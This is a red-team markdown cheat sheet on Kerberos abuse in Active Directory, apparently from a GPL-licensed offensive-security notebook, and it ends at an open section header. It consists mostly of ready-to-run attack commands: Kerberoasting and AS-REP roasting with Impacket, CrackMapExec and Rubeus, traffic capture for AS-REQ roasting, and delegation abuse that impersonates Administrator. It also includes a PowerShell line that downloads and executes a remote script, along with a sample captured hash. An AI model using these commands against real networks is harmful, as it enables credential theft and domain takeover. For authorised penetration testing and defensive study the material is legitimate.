<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Kerberos Abuse


## Attacks
### From a Linux Machine

* Kerberoasting
	* <details><summary>Impacket's GetUserSPNs.py ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md)) (Click to expand)</summary><p>
		* Use Password

				GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
		* Use NT Hash

				GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
	* <details><summary>Kerberoast (pure-python) Toolkit (skelsec) -<br />[https://github.com/skelsec/kerberoast](https://github.com/skelsec/kerberoast) (Click to expand)</summary><p>

			python3 kerberoast spnroast kerberos+pass://"domain"\\"user":"password"@"target" -u "target_user" -r "realm"
	* <details><summary>Kerberoasting (Click to expand)</summary><p>crackmapexec

			crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
* KRB\_AS\_REP Roasting (AS Rep Roasting, ASRepRoast)
	* <details><summary>CrackMapExec (Click to expand)  (did not work in brief testing)</summary><p>

				crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
	* <details><summary>impacket's GetNPUserspy ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md)) (Click to expand)</summary><p>
		1. users list dynamically queried with an LDAP anonymous bind (did not work in brief testing)

				GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
		1. with a users file

				GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
			* Example Output

					root@jack-Virtual-Machine:~# GetNPUsers.py -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast microsoftdelivery.com/
					Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

					[-] User domain_user doesn't have UF_DONT_REQUIRE_PREAUTH set
					[-] User domain_user_ADCS doesn't have UF_DONT_REQUIRE_PREAUTH set

					root@Virtual-Machine:~# cat hashes.asreproast 
					$krb5asrep$23$kerberoastable@MICROSOFTDELIVERY.COM:999078b4b07d224031b3c3f5c6338264$f2987291a2f814b7942038892f1a02e73da2f96b71476fc4896f511e9011a328e357c03cc731cf4bdecbe60a0f4cdf59cd4e62f5eb96a62ab1edd3665514051b31f4600c90a381022cf22e80f726d7353088213f1aafa95756c01d788a75ba85ed47c4c99921f694bae00003a241457f725543ea5eb3e6072074922e3c1a69362b3e6dca49b38bd2b06ca0a1b6975484a4a1ab7fec663e83f97756f608a323e7d8c74b77cee61fefb62fc22ed272d562ca52e4efcffc8b2202cf9a23a82affb436e1797e140dd107f38729163d57d0deb75a652c60d94da231beb01f4b3ce3652ea446ca94aab00e09109c3bfa50f3460e8746c60d4ca3b9fd6ae69ef914
		1. users list dynamically queried with a LDAP authenticated bind (password)

				GetNPUsers.py -request -format hashcat -outputfile ASREProastables1.txt -dc-ip 10.0.0.1 -dc-host dc01.microsoftdelivery.com 'microsoftdelivery.com/domain_user:P@ssw0rd'
			* Example Output

					Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

					Name            MemberOf  PasswordLastSet             LastLogon  UAC      
					--------------  --------  --------------------------  ---------  --------
					kerberoastable            2022-08-12 20:28:37.760303  <never>    0x410280 
* KRB\_AS\_REQ Roasting (AS Req Roasting, ASReqRoast)
	* <details><summary>Recommended: tcpdump + pcredz (Click to expand)</summary><p>
		* References
			* [http://dumpco.re/blog/asreqroast](http://dumpco.re/blog/asreqroast)
		1. Collect network traffic into a pcap file ([AD AITM Guide](Testaments_and_Books/Redvelations/Active_Directory/003-0_AD_AITM.md))

				tcpdump -i <interface> -w <outfile.pcap>
		1. Analyze with PCREDZ

				./PCredz -f <capture.pcap>
* Unconstrained Delegation
	* [Kerberos Relay Attacks Guide](Testaments_and_Books/Redvelations/Active_Directory/003-2_AD_Kerberos_Relay_Attacks.md)
* Resource Based Constained Delegation (RBCD)
	* <details><summary>impacket's rbcd.py (Click to expand)</summary><p>
		1. Edit the target's "rbcd" attribute (ACE abuse)
			1. Read the attribute

					rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action read 'DOMAIN'/'POWERFULUSER':'PASSWORD'
			1. Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity

					rbcd.py -delegate-from 'controlledaccountwithSPN' -delegate-to 'target$' -dc-ip 'DomainController' -action write 'DOMAIN'/'POWERFULUSER':'PASSWORD'
		1. Once the attribute has been modified, getST can then perform all the necessary steps to obtain the final "impersonating" ST (in this case, "Administrator" is impersonated but it can be any user in the environment).

				getST.py -spn "cifs/target" -impersonate Administrator -dc-ip $DomainController 'DOMAIN/controlledaccountwithSPN:SomePassword'
		1. Use the ticket for further authentication ([AD Authentication Guide](Testaments_and_Books/Redvelations/Active_Directory/002-0_AD_Authentication_and_Movement.md))
* Constrained Delegation
	* "Use any authentication protocol" configuration, or a Protocol Transition Attack
		* <details><summary>impacket's getST.py (Click to expand)</summary><p>

				getST -spn "cifs/target" -impersonate "administrator" "microsoftdelivery.com/service:password"
			* Troubleshooting
				
					[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
					[-] Probably SPN is not allowed to delegate by user user1 or initial TGT not forwardable
				* Potential Issues
					* The account was sensitive for delegation, or a member of the "Protected Users" group
					* Protocol Transition Attack here is not possible
	* "Use Kerberos only" configuration (no protocol transitioning)
		* <details><summary>impacket's getST.py (Click to expand)</summary><p>
			1. proceed to a full S4U2 attack (S4U2self + S4U2proxy, a standard RBCD attack, or KCD with protocol transition, to obtain a forwardable silver ticket from a user to one of serviceA's SPNs using serviceB's credentials

					getST -spn "cifs/serviceA" -impersonate "administrator" "domain/serviceB:password"
			1. Use the obtained ticket in a S4U2proxy request, made by serviceA, on behalf of the impersonated user, to obtain access to one of the services serviceA can delegate to.

					getST -spn "cifs/target" -impersonate "administrator" -additional-ticket "administrator.ccache" "domain/serviceA:password"
* Additional Kerberos Abuse: [Kerberos Relay Attacks Guide](Testaments_and_Books/Redvelations/Active_Directory/003-2_AD_Kerberos_Relay_Attacks.md)
* Kerberos Ticket Cracking ([Cracking Guide](Testaments_and_Books/Redvelations/Accounts/003_Cracking.md))

### From a Windows Machine

* <details><summary>Kerberoasting (Click to expand)</summary><p>
	* EXE
		* Rubeus

				Rubeus.exe kerberoast /outfile:kerberoastables.txt
	* PowerShell
		* Empire

				iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
				Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII kerberoastables.txt
* <details><summary>AS\_Rep\_Roasting (AS Rep Roasting, ASRepRoast) (Click to expand)</summary><p>
	* Rubeus

			Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
* <details><summary>KRB\_AS\_REQ Roasting (AS Req Roasting, ASReqRoast) (Click to expand)</summary><p>